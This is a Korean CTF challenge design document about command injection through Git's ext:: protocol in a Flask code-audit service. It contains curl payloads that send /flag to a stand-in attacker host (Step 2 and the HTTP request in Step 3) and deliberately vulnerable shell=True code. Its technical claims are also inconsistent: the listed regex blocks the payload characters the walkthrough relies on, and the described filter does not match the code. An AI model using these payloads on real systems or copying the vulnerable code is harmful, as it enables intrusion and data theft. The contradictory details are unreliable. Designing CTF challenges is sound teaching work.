---
title: Git Submodule Clone Option Injection RCE — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, git, command-injection, rce, submodule, argument-injection]
confidence: high
---

# Git Submodule Clone Option Injection RCE — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Open Repo Auditor (오픈 소스 코드 품질 분석기)
- **난이도**: High
- **핵심 컨셉**: 백엔드에서 외부 시스템 도구(Git CLI)를 호출하여 작동하는 기능 중, 입력값 검증 미흡으로 인해 발생하는 **Git 서브모듈 클론 옵션 주입 RCE(원격 코드 실행)** 취약점 문제입니다. 대상 웹 서비스는 사용자가 입력한 공개 Git 저장소 URL 주소를 기반으로 소스코드를 자동으로 클론하고 분석 리포트를 제공합니다. 이때 백엔드는 저장소 내부의 의존성을 함께 가져오기 위해 `git clone --recurse-submodules [URL]` 명령어를 백그라운드 쉘에서 가동합니다. 공격자는 단순한 HTTP/HTTPS URL이 아닌, 악의적으로 조작된 프로토콜 주소(예: `ext::` 프로토콜) 또는 Git 옵션 플래그가 주입될 수 있는 주소를 입력값으로 전달하여 클론 프로세스 도중 임의의 OS 명령어를 실행시킵니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Code Audit Portal (Python Flask / Celery)**:
  - 사용자로부터 Git 저장소의 URL(예: `https://github.com/user/project`)을 입력받는 API 엔드포인트 `/api/audit`.
  - 내부 작업 큐(Worker)에서 `subprocess.Popen` 또는 `os.system` 등을 사용해 시스템 명령을 구성 및 실행:
    `git clone --recurse-submodules [USER_INPUT] /tmp/repo_xxxx`
- **Flag 위치**:
  - `/flag`에 파일 형태로 저장되어 있으며 RCE로 탈취해야 합니다.

### 2.2 취약점 지점
1. **Unsanitized OS Command Execution**:
   - 개발자는 URL 포맷이 단순 텍스트로 오므로 `http` 또는 `https`로 시작하는지 정규표현식으로만 가볍게 확인하고, 파이썬의 `shell=True` 인자와 함께 문자열을 직접 바인딩하여 쉘에 넘겨줍니다.
2. **Git Protocol Helper Abuse (`ext::`)**:
   - Git 클라이언트 도구는 내부적으로 외부 도우미 프로그램(Protocol Helper)을 연동할 수 있도록 `ext::` 프로토콜을 지원합니다.
   - `git clone ext::[Command]` 형태의 저장소 주소 인자를 전달받으면, Git은 해당 주소를 파싱하여 내부 명령어로 해석하지 않고 OS 쉘에 인수로 지정된 `[Command]` 문자열을 직접 투입하여 기동합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 파라미터 | 역할 |
|------------|--------|------|----------|------|
| `/api/audit` | POST | 세션 필요 | `repo_url` | 분석 대상 Git 저장소 주소 (공격 벡터 주입점) |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. Git 명령어 실행 구조 분석
1. 사용자는 임의의 정상 깃 주소를 기입하고 호출하여 동작 양상을 파악합니다.
2. 에러 로그 출력을 분석하거나 시스템 특성을 고려했을 때 내부적으로 `git clone`을 사용하며, 서브모듈 동기화(`--recurse-submodules` 혹은 `git submodule update --init`)가 내부적으로 자동 작동하고 있음을 유추합니다.

### Step 2. git ext 프로토콜을 활용한 RCE 페이로드 구성
Git은 저장소 주소를 지정할 때 `ext::` 스키마를 통해 원격 커넥션을 위해 임의의 외부 명령어를 호출할 수 있습니다.
- **Git ext 프로토콜 개념 구조**:
  `ext::<command> <arguments>`
  이 주소로 클론을 시도하면 Git은 `<command>`에 해당하는 임의의 쉘 명령어를 실행하여 데이터를 송수신하려 합니다.
- **쉘 주입용 공격 페이로드**:
  `ext::curl http://attacker.local/log?c=$(cat /flag)`
  *(공백 처리를 위해 간접 명령을 수행해야 할 수도 있습니다: `ext::sh%20-c%20"curl%20attacker.local/log?c=\$(cat%20/flag)"`)*

### Step 3. 우회 입력값 전달
1. 웹 서비스의 입력값 필터링에 `http://` 또는 `https://`로 시작해야 한다는 규칙이 있다면, 공격자는 이를 속이기 위해 URL 주소 맨 뒤에 프로토콜 파라미터를 추가하거나, 혹은 Git의 다른 옵션 인젝션 기법을 사용합니다.
2. 필터가 약하다면 즉시 `repo_url` 값에 `ext::curl...`을 삽입하여 전달합니다.
   - **요청 데이터 예시**:
     ```http
     POST /api/audit HTTP/1.1
     Host: audit.challenge.local
     Content-Type: application/json
     
     {
       "repo_url": "ext::sh -c curl\\${IFS}http://attacker.local/log?c=\\$(cat\\${IFS}/flag)"
     }
     ```
     *(대체용으로 `${IFS}` 공백 우회 기법이 동반되어 쓰일 수 있음)*

### Step 4. flag 획득
1. 백엔드 워커(Worker) 프로세스가 수신한 주소를 바탕으로 내부 쉘 명령어를 트리거합니다:
   `git clone --recurse-submodules "ext::sh -c curl..." /tmp/repo_tmp`
2. Git은 해당 주소 스펙을 해석하여 `ext` 프로토콜 헬퍼 기능을 내부적으로 기동하며, OS 명령어가 실행되어 `/flag` 데이터가 유출됩니다.
3. 공격자 서버 웹로그에서 플래그(`FLAG{git_ext_helper_protocol_submodule_command_injection_rce}`)를 디코딩하여 플래그를 취득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python Flask)

```python
# app.py (취약한 Flask 백엔드 서버)
import subprocess
import re
from flask import Flask, request, jsonify

app = Flask(__name__)

# 취약점 지점: 입력값에 대한 도메인/프로토콜 화이트리스트 검증이 부실함
# 단순히 알파벳과 특수기호로 이루어진 주소 문자열만 체크
def is_valid_url(url):
    # ext:: 및 기타 쉘 주입 관련 특수 패턴 차단이 누락됨
    if re.match(r"^[a-zA-Z0-9_\-:/@. ]+$", url):
        return True
    return False

@app.route('/api/audit', methods=['POST'])
def run_audit():
    data = request.json
    repo_url = data.get('repo_url', '')

    if not is_valid_url(repo_url):
        return jsonify({"status": "error", "message": "Invalid Repository URL Format"}), 400

    # 취약점 지점 2: shell=True 인자를 활성화하고 사용자 입력을 포맷팅하여 직접 쉘에 투입
    # 이로 인해 git clone이 인자로 전달받은 ext:: 프로토콜 명령어를 실행하게 됨
    cmd = f"git clone --recurse-submodules '{repo_url}' /tmp/repo_audit"
    try:
        # subprocess shell=True로 인해 문자열 전체가 쉘 명령 파서로 입력됨
        result = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        stdout, stderr = result.communicate(timeout=15)
        return jsonify({"status": "success", "log": stdout.decode('utf-8', errors='ignore')})
    except Exception as e:
        return jsonify({"status": "error", "log": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **프로토콜 스키마 명시적 통제 (Strict Protocol Whitelisting)**:
   - 외부 깃 클라이언트를 구동하기 전, 입력된 주소가 정확히 `https://` 또는 `git://` 스키마로 시작하는지 확실히 규정하고, `ext::`나 `file::` 같은 불필요하고 위험한 헬퍼 스펙은 정규표현식 및 문자열 파서로 엄격하게 기각합니다.
2. **Git 환경 설정 제한 (Disable Git Protocol Helpers)**:
   - 서버 환경 내에서 신뢰하지 않는 원격 저장소를 핸들링할 때, Git 환경 파라미터 설정을 변경하여 위험한 외부 프로토콜 가동을 차단합니다.
   - 예: 환경 변수로 `GIT_ALLOW_PROTOCOL=http:https:git`를 지정하여 `ext::` 프로토콜 헬퍼 자체가 로드되는 것을 물리적으로 막아냅니다.
3. **`shell=True` 사용 배제 및 인자 배열 분리**:
   - `subprocess.run` 또는 `subprocess.Popen` 구동 시 `shell=True` 옵션을 해제하고, 실행 파일 파라미터와 인자들을 명확하게 리스트 형식으로 넘겨 명령어 주입(Command Injection) 틈새를 사전에 없앱니다.
     ```python
     # 예시: shell=True가 없으면 ext::가 인자 자체로 전달되나 쉘 해석 단계를 건너뜀
     subprocess.run(["git", "clone", "--recurse-submodules", repo_url, "/tmp/repo_audit"])
     ```
